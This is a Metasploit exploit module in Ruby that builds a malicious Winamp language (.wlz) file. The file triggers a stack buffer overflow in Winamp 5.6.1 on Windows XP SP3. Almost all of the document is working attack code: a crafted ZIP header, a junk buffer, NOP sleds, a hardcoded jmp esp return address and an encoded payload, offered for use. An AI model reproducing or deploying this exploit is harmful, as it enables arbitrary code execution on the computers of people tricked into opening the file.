# Winamp <=5.6.1 Install Language SEH Exploit (meta)
# By KedAns-Dz
# $ winamp_lng_wlz.rb | 13/04/2011 22:27 $
# Windows XP Sp3

require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name' => 'Winamp <=5.6.1 Install Language SEH Exploit',
			'Description'    => %q{
				This module exploits a stack buffer overflow in versions v5.6.1
				In Winamp 5.6.1 Install New Language with (.wlz) file,
                and In File (.wlz) can Inclusion SEH for Installing	an attacker 
				may be able to execute arbitrary code.
			},
            'License' => MSF_LICENSE,
            'Author' => 'KedAns-Dz <ked-h[at]hotmail.com> | <ked-h[at]exploit-id.com>',
            'Version' => 'Version 1',
            'References' =>
                [
                    [ 'URL', 'http://1337day.com/exploits/15836' ],
                    [ 'URL', 'http://exploit-id.com/local-exploits/winamp' ],
                    [ 'URL', 'http://packetstormsecurity.org/files/view/100322/winamp561-seh.txt' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'seh',
                },
            'Payload' =>
                {
                    'Space' => 900,
                    'BadChars' => "\x00\x20\x0a\x0d",
                    'StackAdjustment' => -3500,
                    'DisableNops' => 'True',
				},
            'Platform' => 'win',
            'Targets' =>
                [
                    [ 'Windows XP SP3 France', { 'Ret' => 0x7C86467B} ], # jmp esp from kernel32.dll
 
                ],
            'Privileged' => false,
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ false, 'The file name.', 'ar-dz.wlz']),
            ], self.class)
    end
 
 
    def exploit

    sploit = "\x50\x4b\x03\x04\x14\x00\x00\x00\x00\x00\x2f\x92\x7b\x3d\xd3\x55" +
             "\x30\x92\x00\x28\x00\x00\x00\x28\x00\x00\x08\x00\x00\x00\x61\x75" +
             "\x74\x68\x2e\x6c\x6e\x67" # Header
		sploit << "\xeb\x06\x90\x90"  # short jump 
	    sploit << "\x41" * 321 # buffer Junk
		sploit << "\x90" * 20 # nop sled
		sploit << [target.ret].pack('V')
        sploit << "\xeb\x06\x90\x90"  # short jump 
        sploit << payload.encoded
		sploit << "\x90" * 51 # nop sled
		
        ked = sploit
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(ked)
 
    end
 
end
